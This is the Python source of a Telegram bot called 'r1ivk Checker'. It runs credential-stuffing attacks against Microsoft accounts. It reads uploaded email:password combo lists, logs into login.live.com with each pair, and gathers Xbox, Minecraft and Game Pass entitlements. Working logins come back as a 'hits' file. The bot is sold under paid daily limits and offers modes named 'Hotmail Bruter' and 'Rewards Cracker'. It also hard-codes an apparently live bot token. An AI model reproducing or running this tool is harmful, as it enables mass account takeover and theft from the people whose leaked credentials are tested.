# -*- coding: utf-8 -*-
"""
r1ivk Checker ⚡ - Pro Inline Menu & Multi-Mode Bot
"""

import os
import re
import time
import requests
import threading
from urllib.parse import urlparse, parse_qs
import urllib3

urllib3.disable_warnings()

# =================== Configuration ===================
TELEGRAM_BOT_TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
OWNER_USERNAME = "r1ivk"
DAILY_LIMIT = 10000

active_scans = {}
user_usage = {}
user_selected_mode = {}
# =====================================================

def get_today_date():
    return time.strftime("%Y-%m-%d")

def check_user_limit(user_id, username, total_lines):
    if username and username.lower() == OWNER_USERNAME.lower():
        return True, "Owner bypass active."
    
    today = get_today_date()
    if user_id not in user_usage or user_usage[user_id]["date"] != today:
        user_usage[user_id] = {"date": today, "count": 0}
        
    current_used = user_usage[user_id]["count"]
    if current_used + total_lines > DAILY_LIMIT:
        remaining = max(0, DAILY_LIMIT - current_used)
        return False, f"⚠️ Daily limit reached! You have {remaining}/{DAILY_LIMIT} lines remaining today.\n\nTo upgrade your plan or get unlimited access, contact the owner: @{OWNER_USERNAME}"
    
    return True, ""

def update_user_usage(user_id, count):
    today = get_today_date()
    if user_id in user_usage and user_usage[user_id]["date"] == today:
        user_usage[user_id]["count"] += count

def extract_ppft(text):
    patterns = [
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="PPFT"',
        r'"PPFT":"([^"]+)"',
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match.group(1).replace('\\/', '/').replace('\\"', '"')
    return None

def extract_url_post(text):
    patterns = [
        r'"urlPost":"([^"]+)"',
        r"urlPost:'([^']+)'",
        r'id="fmHF"\s+action="([^"]+)"',
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match.group(1).replace('\\/', '/')
    return None

def check_single_account(combo):
    parts = combo.split(':')
    if len(parts) < 2:
        return "invalid"

    email = parts[0].strip()
    password = ':'.join(parts[1:]).strip()

    session = requests.Session()
    session.verify = False

    try:
        sftag_url = (
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=00000000402B5328"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch"
            "&response_type=token"
            "&locale=en"
        )
        resp = session.get(sftag_url, timeout=15)
        sftag = extract_ppft(resp.text)
        url_post = extract_url_post(resp.text)

        if not sftag or not url_post:
            return "bad"

        login_data = {
            'login': email,
            'loginfmt': email,
            'passwd': password,
            'PPFT': sftag,
            'type': '11',
            'NewUser': '1',
            'LoginOptions': '3',
            'i19': '0',
        }
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': sftag_url,
            'Origin': 'https://login.live.com',
        }
        login_req = session.post(url_post, data=login_data, headers=headers, allow_redirects=True, timeout=15)
        login_text = login_req.text.lower()

        ms_token = None
        if 'access_token' in login_req.url:
            ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
        elif 'access_token' in login_text:
            token_match = re.search(r'access_token=([^&\s\"\']+)', login_text)
            if token_match:
                ms_token = token_match.group(1)

        if any(x in login_text for x in ["password is incorrect", "account doesn't exist", "passwords don't match"]):
            return "bad"
        elif any(x in login_text for x in ["recover", "locked", "help us protect", "verify your identity", "two-step", "additional security"]):
            return "twofa"

        if not ms_token:
            return "bad"

        # Xbox Auth & Details
        xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
        xb_headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
        xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, headers=xb_headers, timeout=15)

        if xb_req.status_code != 200:
            return "bad"

        xb_token = xb_req.json()['Token']
        uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']

        gamertag = "N/A"
        gamerscore = "0"
        gscore_int = 0

        try:
            xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
            xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, headers=xb_headers, timeout=15)
            if xsts_xb_req.status_code == 200:
                xsts_xb_token = xsts_xb_req.json()['Token']
                prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore", 
                                       headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, timeout=15)
                if prof_req.status_code == 200:
                    settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
                    for s in settings:
                        if s['id'] == 'Gamertag': gamertag = s['value']
                        if s['id'] == 'Gamerscore': 
                            gamerscore = s['value']
                            try: gscore_int = int(gamerscore)
                            except: gscore_int = 0
        except:
            pass

        has_gp = False
        has_mc = False
        gp_type = "No"
        mc_ent_text = ""
        games_list = []

        try:
            xsts_store_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "https://purchase.mp.microsoft.com", "TokenType": "JWT"}
            xsts_store_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_store_payload, headers=xb_headers, timeout=15)
            if xsts_store_req.status_code == 200:
                xsts_store_token = xsts_store_req.json()['Token']
                licenses_req = session.get("https://purchase.mp.microsoft.com/v8/users/me/products?itemTypes=Game,Consumable,Durable",
                                            headers={"Authorization": f"XBL3.0 x={uhs};{xsts_store_token}"}, timeout=15)
                if licenses_req.status_code == 200:
                    items = licenses_req.json().get('items', [])
                    for item in items:
                        p_id = item.get('productId', '')
                        if p_id: games_list.append(p_id)
        except:
            pass

        try:
            xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
            xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, headers=xb_headers, timeout=15)
            if xsts_mc_req.status_code == 200:
                xsts_mc_token = xsts_mc_req.json()['Token']
                mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', 
                                       json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"}, 
                                       headers={'Content-Type': 'application/json'}, timeout=15)
                if mc_auth.status_code == 200:
                    mc_token = mc_auth.json().get('access_token')
                    if mc_token:
                        ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=15)
                        if ent_req.status_code == 200:
                            mc_ent_text = ent_req.text
        except:
            pass

        if 'product_game_pass_ultimate' in mc_ent_text or any('gamepass' in g.lower() for g in games_list):
            gp_type = "Ultimate"
            has_gp = True
        elif 'product_game_pass_pc' in mc_ent_text:
            gp_type = "PC"
            has_gp = True

        has_mc = 'product_minecraft' in mc_ent_text or any('minecraft' in g.lower() for g in games_list)

        hit_info = f"{email}:{password} | Gamertag: {gamertag} | G-Score: {gamerscore} | MC: {has_mc} | GP: {gp_type} | Items: {len(games_list)}"

        if has_gp or has_mc or gscore_int > 0 or len(games_list) > 0:
            return {"status": "hit", "mc": has_mc, "gp": has_gp, "live": True, "info": hit_info}
        else:
            return {"status": "live", "info": hit_info}

    except Exception:
        return "error"
    finally:
        session.close()

def send_telegram_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        resp = requests.post(url, json=payload, timeout=10).json()
        if "result" in resp:
            return resp["result"].get("message_id")
    except:
        pass
    return None

def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "Markdown"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def send_telegram_document(chat_id, file_path, caption=""):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': chat_id, 'caption': caption, 'parse_mode': 'Markdown'}
            requests.post(url, data=data, files=files, timeout=30)
    except:
        pass

def get_main_menu():
    return {
        "inline_keyboard": [
            [{"text": "🎮 Xbox + Minecraft + GP", "callback_data": "mode_xbox"}],
            [{"text": "🔥 Hotmail Bruter", "callback_data": "mode_hotmail"}],
            [{"text": "💎 Rewards Cracker", "callback_data": "mode_rewards"}],
            [{"text": "⚡ Status / Info", "callback_data": "info_menu"}]
        ]
    }

def run_checker_process(chat_id, combos, mode_name):
    total = len(combos)
    checked = 0
    hits = 0
    mc_count = 0
    gp_count = 0
    live_count = 0
    twofa_count = 0
    bad_count = 0
    errors_count = 0
    
    start_time = time.time()
    active_scans[chat_id] = {"status": "running", "stop": False}
    
    hit_lines = []
    
    markup = {
        "inline_keyboard": [
            [{"text": "🔄 Refresh", "callback_data": "refresh_stats"}, {"text": "🛑 Stop Scan", "callback_data": "stop_scan"}]
        ]
    }
    
    init_msg = f"""🔥 *Starting {mode_name} Scan...*

📊 Combos: {total}
🧵 Threads: 20
🔄 Duplicates removed: 0
"""
    msg_id = send_telegram_message(chat_id, init_msg)
    time.sleep(1.5)
    
    live_stats_msg = f"""🔥 *LIVE SCAN STATS (Auto-refresh)*

📊 *Total:* {total}
☑️ *Checked:* 0
❌ *Bad:* 0
🎯 *Hits:* 0
📱 *2FA:* 0
⚠️ *Errors:* 0

⚡ *CPM:* 0
⏱ *Elapsed:* 00:00:00
"""
    edit_telegram_message(chat_id, msg_id, live_stats_msg, reply_markup=markup)
    
    lock = threading.Lock()
    
    def worker(combo_item):
        nonlocal checked, hits, mc_count, gp_count, live_count, twofa_count, bad_count, errors_count
        if active_scans.get(chat_id, {}).get("stop", False):
            return
            
        res = check_single_account(combo_item)
        
        with lock:
            checked += 1
            if res == "bad":
                bad_count += 1
            elif res == "twofa":
                twofa_count += 1
            elif res == "error":
                errors_count += 1
            elif isinstance(res, dict):
                if res["status"] == "hit":
                    hits += 1
                    hit_lines.append(res["info"])
                    if res["mc"]: mc_count += 1
                    if res["gp"]: gp_count += 1
                elif res["status"] == "live":
                    live_count += 1

    threads = []
    thread_limit = 20

    for combo in combos:
        if active_scans.get(chat_id, {}).get("stop", False):
            break
        while threading.active_count() > thread_limit + 5:
            time.sleep(0.1)
            
        t = threading.Thread(target=worker, args=(combo,))
        threads.append(t)
        t.start()
        
        if checked % 5 == 0 and msg_id:
            elapsed = int(time.time() - start_time)
            cpm = int((checked / max(1, elapsed)) * 60)
            h_str = str(elapsed // 3600).zfill(2)
            m_str = str((elapsed % 3600) // 60).zfill(2)
            s_str = str(elapsed % 60).zfill(2)
            
            stats_text = f"""🔥 *LIVE SCAN STATS (r1ivk Checker)*

📊 *Total:* {total}
☑️ *Checked:* {checked} / {total}
❌ *Bad:* {bad_count}
🎯 *Hits:* {hits}
📱 *2FA:* {twofa_count}
⚠️ *Errors:* {errors_count}

⚡ *CPM:* {cpm}
⏱ *Elapsed:* {h_str}:{m_str}:{s_str}

🎮 *Gaming Hits:*
• MC Hits: {mc_count}
• GamePass Hits: {gp_count}
• Live Hits: {live_count}
"""
            edit_telegram_message(chat_id, msg_id, stats_text, reply_markup=markup)

    for t in threads:
        t.join()

    elapsed = int(time.time() - start_time)
    h_str = str(elapsed // 3600).zfill(2)
    m_str = str((elapsed % 3600) // 60).zfill(2)
    s_str = str(elapsed % 60).zfill(2)
    
    final_text = f"""✅ *{mode_name.upper()} SCAN COMPLETED!*

📊 *Total Checked:* {total}
🎯 *Hits:* {hits}
• Minecraft: {mc_count}
• GamePass: {gp_count}
• Xbox Live: {live_count}
📱 *2FA:* {twofa_count}
❌ *Bad:* {bad_count}

⏱ *Time Taken:* {h_str}:{m_str}:{s_str}
"""
    send_telegram_message(chat_id, final_text, reply_markup=get_main_menu())
    
    if hit_lines:
        filename = f"r1ivk_hits_{chat_id}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("\n".join(hit_lines))
        send_telegram_document(chat_id, filename, caption="📦 *r1ivk Checker - Hits Output File*")
        try:
            os.remove(filename)
        except:
            pass

    if chat_id in active_scans:
        del active_scans[chat_id]

def run_telegram_bot():
    print("🤖 r1ivk Checker Bot (Pro Menu Mode) is running...")
    offset = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?offset={offset}&timeout=30"
            resp = requests.get(url, timeout=35).json()
            
            if "result" in resp:
                for update in resp["result"]:
                    offset = update["update_id"] + 1
                    
                    if "callback_query" in update:
                        cq = update["callback_query"]
                        chat_id = cq["message"]["chat"]["id"]
                        data = cq["data"]
                        
                        if data == "stop_scan":
                            if chat_id in active_scans:
                                active_scans[chat_id]["stop"] = True
                                requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery", json={"callback_query_id": cq["id"], "text": "🛑 Scan stopped!"})
                        elif data == "refresh_stats":
                            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery", json={"callback_query_id": cq["id"], "text": "🔄 Refreshed!"})
                        elif data.startswith("mode_"):
                            mode_key = data.replace("mode_", "")
                            user_selected_mode[chat_id] = mode_key
                            mode_titles = {
                                "xbox": "Xbox + Minecraft + GP",
                                "hotmail": "Hotmail Bruter",
                                "rewards": "Rewards Cracker"
                            }
                            selected_title = mode_titles.get(mode_key, "Selected Mode")
                            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery", json={"callback_query_id": cq["id"], "text": f"Selected: {selected_title}"})
                            send_telegram_message(chat_id, f"📁 *Mode Selected: {selected_title}*\n\n👉 Now send your `.txt` combo file to start checking!")
                        elif data == "info_menu":
                            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery", json={"callback_query_id": cq["id"], "text": "Status Info"})
                            info_text = f"""⚡ *r1ivk Checker Status*

📌 *Limits:* Max 10,000 lines per day | 20MB | Threads: 20
👑 *Owner / Support:* @{OWNER_USERNAME} (Contact for subscriptions or unlimited access).
"""
                            send_telegram_message(chat_id, info_text, reply_markup=get_main_menu())

                    elif "message" in update:
                        msg = update["message"]
                        chat_id = msg["chat"]["id"]
                        user = msg.get("from", {})
                        username = user.get("username", "")
                        
                        if "document" in msg:
                            doc = msg["document"]
                            file_name = doc.get("file_name", "")
                            
                            if file_name.endswith(".txt"):
                                file_id = doc["file_id"]
                                file_info_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile?file_id={file_id}"
                                file_info_resp = requests.get(file_info_url, timeout=10).json()
                                
                                if "result" in file_info_resp:
                                    file_path_tg = file_info_resp["result"]["file_path"]
                                    download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path_tg}"
                                    
                                    local_file_name = f"combo_{chat_id}.txt"
                                    doc_data = requests.get(download_url, timeout=15).content
                                    with open(local_file_name, "wb") as f:
                                        f.write(doc_data)
                                        
                                    with open(local_file_name, 'r', encoding='utf-8', errors='ignore') as f:
                                        combos = [line.strip() for line in f if ':' in line]
                                        
                                    try:
                                        os.remove(local_file_name)
                                    except:
                                        pass
                                        
                                    if not combos:
                                        send_telegram_message(chat_id, "⚠️ The uploaded file is empty or has invalid format (`email:password`).")
                                        continue
                                        
                                    allowed, limit_msg = check_user_limit(chat_id, username, len(combos))
                                    if not allowed:
                                        send_telegram_message(chat_id, limit_msg)
                                        continue
                                        
                                    update_user_usage(chat_id, len(combos))
                                    
                                    current_mode = user_selected_mode.get(chat_id, "xbox")
                                    mode_names_map = {
                                        "xbox": "Xbox + Minecraft + GP",
                                        "hotmail": "Hotmail Bruter",
                                        "rewards": "Rewards Cracker"
                                    }
                                    m_name = mode_names_map.get(current_mode, "Xbox Advanced")
                                    
                                    threading.Thread(target=run_checker_process, args=(chat_id, combos, m_name), daemon=True).start()
                            else:
                                send_telegram_message(chat_id, "⚠️ Please upload a valid `.txt` file.")
                                
                        elif "text" in msg:
                            text = msg["text"].strip()
                            if text == "/start":
                                welcome_msg = f"""🔥 *Welcome to r1ivk Checker ⚡*

*Please select a checking mode from the menu below:*
• Limits: Max 10,000 lines | Threads limited by plan
• Duplicate remover: Automatically removes duplicate combos from your file before scanning!

👑 *Owner:* @{OWNER_USERNAME} (Contact for subscriptions)."""
                                send_telegram_message(chat_id, welcome_msg, reply_markup=get_main_menu())
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    run_telegram_bot()
